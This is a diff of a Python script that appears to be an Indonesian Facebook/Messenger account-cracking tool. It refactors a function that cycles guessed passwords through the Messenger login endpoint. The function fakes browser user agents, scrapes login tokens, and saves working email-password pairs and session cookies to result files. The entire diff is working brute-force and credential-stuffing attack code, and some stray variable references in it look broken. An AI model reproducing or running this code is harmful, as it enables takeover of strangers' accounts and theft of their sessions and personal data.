@@ -1852,7 +1852,7 @@ def metcepat():
                 elif "mbasik" in method:
                     pool.submit(mobile, idf, pwv)
                 elif "regulerv2" in method:
-                    pool.submit(main_alpha,id2,idf, pwv)
+                    pool.submit(main_alpha,idf, pwv)
                 else:
                     pool.submit(mobile, idf, pwv)
     print("")
@@ -1871,102 +1871,17 @@ def metcepat():
     print("")
 
 # Crack Dengan Metode Messenger
-def main_alpha(total, email, pwv):
-    global Looping, Ok, Cp
-    prog.update(des,description=f" {K2}•{H2} M_ALPHA {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(total)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
-    prog.advance(des)
-    try:
-        for password in pwv:
-            with requests.Session() as r:
-                acak_device = random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 13_2', 'X11; Linux x86_64'])
-                browser_version = (f'{random.randrange(90, 108)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
-                useragent = ('Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(acak_device, browser_version))
-                r.headers.update({
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'accept-language': 'en-US,en;q=0.9',
-                    'connection': 'keep-alive',
-                    'Host': 'www.alpha.messenger.com',
-                    'sec-fetch-user': '?1',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-fetch-dest': 'document',
-                    'sec-fetch-mode': 'navigate',
-                    'sec-fetch-site': 'none',
-                    'upgrade-insecure-requests': '1',
-                    'user-agent': useragent,
-                    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+).', str(useragent)).group(1), re.search('Chrome/(\d+).', str(useragent)).group(1)),
-                })
-                response = r.get('https://www.alpha.messenger.com/').text
-                try:
-                    jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
-                    lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
-                    initial_request_id = re.search('name="initial_request_id" value="(.*?)"', str(response)).group(1)
-                    lgnrnd = re.search('name="lgnrnd" value="(.*?)"', str(response)).group(1)
-                    lgnjs = re.search('name="lgnjs" value="(.*?)"', str(response)).group(1)
-                    _js_datr = re.search('"_js_datr","(.*?)"', str(response)).group(1)
-                except (AttributeError):
-                    print("[bold white][[bold yellow]![bold white]][bold yellow] AttributeError...                            ", end='\r');time.sleep(1.0);continue
-                r.headers.update({
-                    'origin': 'https://www.alpha.messenger.com',
-                    'sec-fetch-site': 'same-origin',
-                    'referer': 'https://www.alpha.messenger.com/',
-                    'cache-control': 'max-age=0',
-                    'cookie': '_js_datr={}; wd=1280x601; dpr=1.5'.format(_js_datr),
-                    'accept-encoding': 'gzip, deflate, br',
-                    'content-type': 'application/x-www-form-urlencoded',
-                })
-                data = {
-                    'jazoest': jazoest,
-                    'lsd': lsd,
-                    'initial_request_id': initial_request_id,
-                    'timezone': '-420',
-                    'lgndim': '',
-                    'lgnrnd': lgnrnd,
-                    'lgnjs': lgnjs,
-                    'email': email,
-                    'pass': password,
-                    'login': '1',
-                    'persistent': '1',
-                    'default_persistent': '',
-                }
-                response2 = r.post('https://www.alpha.messenger.com/login/password/', data = data, allow_redirects = True)
-                #open('Data/Response.txt', 'a').write(f'{email}<=>{password}<=>{r.cookies.get_dict()}<=>{response2.url}\n')
-                if 'c_user' in r.cookies.get_dict():
-                    tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style="bold white"))
-                    tree.add(Panel(f"[bold green]{email}[bold white]|[bold green]{password}[bold white]|[bold green]{';'.join([str(x)+'='+str(y) for x,y in r.cookies.get_dict().items()])}", width = 44, style="bold white"))
-                    tree.add(Panel(f"[bold green]{useragent}", width = 44, style="bold white"))
-                    print(tree)
-                    Ok.append(f'{email}|{password}')
-                    with open('Results/Ok.txt', 'a+') as w:
-                        w.write(f'{email}|{password}\n')
-                    w.close();break
-                elif 'checkpoint_interstitial' in str(response2.url):
-                    tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style="bold white"))
-                    tree.add(Panel(f"[bold red]{email}[bold white]|[bold red]{password}", width = 44, style="bold white"))
-                    tree.add(Panel(f"[bold red]{useragent}", width = 44, style="bold white"))
-                    print(tree)
-                    Cp.append(f'{email}|{password}')
-                    with open('Results/Cp.txt', 'a+') as w:
-                        w.write(f'{email}|{password}\n')
-                    w.close();break
-                else:
-                    continue
-        Looping += 1
-        print(f"[bold white][Crack] [bold blue]{email}[bold white]/[bold blue]{str(len(total))}[bold white]/[bold blue]{Looping}[bold white] Ok-:[bold green]{len(Ok)}[bold white] Cp-:[bold yellow]{len(Cp)}               ", end='\r')
-    except (RequestException) as e:
-        print("[bold white][[bold red]![bold white]][bold red] Koneksi Error...                            ", end='\r');time.sleep(7.5);main_alpha(total, email, pwx)
-# Crack Dengan Metode B-Www
-# Crack Dengan Metode Messenger
-def main_alphaj(idf, pwv):
+def main_alpha(idf, pwv):
 	global Looping, Ok, Cp,loop, ok, cp
-	try:
-		prog.update(des,description=f" {K2}•{H2} M_ALPHA {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
-		prog.advance(des)
-		for pw in pwv:
-			with requests.Session() as r:
-				acak_device = random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 13_2', 'X11; Linux x86_64'])
-				browser_version = (f'{random.randrange(90, 108)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
-				useragent = ('Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(acak_device, browser_version))
-				r.headers.update({
+	r = requests.Session()
+	prog.update(des,description=f" {K2}•{H2} M_ALPHA {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+	prog.advance(des)
+	for pw in pwv:
+		try:
+			acak_device = random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 13_2', 'X11; Linux x86_64'])
+			browser_version = (f'{random.randrange(90, 108)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
+			useragent = ('Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(acak_device, browser_version))
+			r.headers.update({
                     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                     'accept-language': 'en-US,en;q=0.9',
                     'connection': 'keep-alive',
@@ -1979,18 +1894,18 @@ def main_alphaj(idf, pwv):
                     'upgrade-insecure-requests': '1',
                     'user-agent': useragent,
                     'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+).', str(useragent)).group(1), re.search('Chrome/(\d+).', str(useragent)).group(1)),
-                })
-				response = r.get('https://www.alpha.messenger.com/').text
-				try:
-					jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
-					lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
-					initial_request_id = re.search('name="initial_request_id" value="(.*?)"', str(response)).group(1)
-					lgnrnd = re.search('name="lgnrnd" value="(.*?)"', str(response)).group(1)
-					lgnjs = re.search('name="lgnjs" value="(.*?)"', str(response)).group(1)
-					_js_datr = re.search('"_js_datr","(.*?)"', str(response)).group(1)
-				except (AttributeError):
-					print("[bold white][[bold yellow]![bold white]][bold yellow] AttributeError...                            ", end='\r');time.sleep(1.0);continue
-				r.headers.update({
+			})
+			response = r.get('https://www.alpha.messenger.com/').text
+			try:
+				jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
+				lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
+				initial_request_id = re.search('name="initial_request_id" value="(.*?)"', str(response)).group(1)
+				lgnrnd = re.search('name="lgnrnd" value="(.*?)"', str(response)).group(1)
+				lgnjs = re.search('name="lgnjs" value="(.*?)"', str(response)).group(1)
+				_js_datr = re.search('"_js_datr","(.*?)"', str(response)).group(1)
+			except (AttributeError):
+				print("[bold white][[bold yellow]![bold white]][bold yellow] AttributeError...                            ", end='\r');time.sleep(1.0);continue
+			r.headers.update({
                     'origin': 'https://www.alpha.messenger.com',
                     'sec-fetch-site': 'same-origin',
                     'referer': 'https://www.alpha.messenger.com/',
@@ -1998,8 +1913,8 @@ def main_alphaj(idf, pwv):
                     'cookie': '_js_datr={}; wd=1280x601; dpr=1.5'.format(_js_datr),
                     'accept-encoding': 'gzip, deflate, br',
                     'content-type': 'application/x-www-form-urlencoded',
-                })
-				data = {
+			})
+			data = {
                     'jazoest': jazoest,
                     'lsd': lsd,
                     'initial_request_id': initial_request_id,
@@ -2012,33 +1927,33 @@ def main_alphaj(idf, pwv):
                     'login': '1',
                     'persistent': '1',
                     'default_persistent': '',
-                }
-				response2 = r.post('https://www.alpha.messenger.com/login/password/', data = data, allow_redirects = True)
-				#open('Data/Response.txt', 'a').write(f'{email}<=>{password}<=>{r.cookies.get_dict()}<=>{response2.url}\n')
-				if 'c_user' in r.cookies.get_dict():
-					ok += 1
-					coki = po.cookies.get_dict()
-					kuki = (";").join(["%s=%s" % (key, value)for key, value in ses.cookies.get_dict().items()])
-					tree = Tree(f"  ")
-					tree.add(f"[green]{idf}").add(f"[green]{pw}").add(f"[green]{useragent}\n")
-					tree.add(f"[green]{kuki}\n")
-					cetak(tree)
-					open("OK/" + okc, "a").write(idf + "|" + pw + "|" + useragent + "\n")
-					break
-				elif 'checkpoint_interstitial' in str(response2.url):
-					tree = Tree(f" ")
-					tree.add(f"[red]{idf}").add(f"[red]{pw}")
-					tree.add(f"[red]{useragent}\n")
-					cetak(tree)
-					open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
-					akun.append(idf + "|" + pw)
-					cp += 1
-					break
-				else:
-					continue
-			Looping += 1
-	except (RequestException) as e:
-		print("[bold white][[bold red]![bold white]][bold red] Koneksi Error...                            ", end='\r');time.sleep(7.5);main_alpha(total, idf, pwv)
+			}
+			response2 = r.post('https://www.alpha.messenger.com/login/password/', data = data, allow_redirects = True)
+			#open('Data/Response.txt', 'a').write(f'{email}<=>{password}<=>{r.cookies.get_dict()}<=>{response2.url}\n')
+			if 'c_user' in r.cookies.get_dict():
+				ok += 1
+				coki = po.cookies.get_dict()
+				kuki = (";").join(["%s=%s" % (key, value)for key, value in ses.cookies.get_dict().items()])
+				tree = Tree(f"  ")
+				tree.add(f"[green]{idf}").add(f"[green]{pw}").add(f"[green]{useragent}\n")
+				tree.add(f"[green]{kuki}\n")
+				cetak(tree)
+				open("OK/" + okc, "a").write(idf + "|" + pw + "|" + useragent + "\n")
+				break
+			elif 'checkpoint_interstitial' in str(response2.url):
+				tree = Tree(f" ")
+				tree.add(f"[red]{idf}").add(f"[red]{pw}")
+				tree.add(f"[red]{useragent}\n")
+				cetak(tree)
+				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+				akun.append(idf + "|" + pw)
+				cp += 1
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+            time.sleep(31)
+    loop += 1
 # --------------------[ METODE MOBILE ]-----------------#
 def mobile(idf, pwv):
     global loop, ok, cp
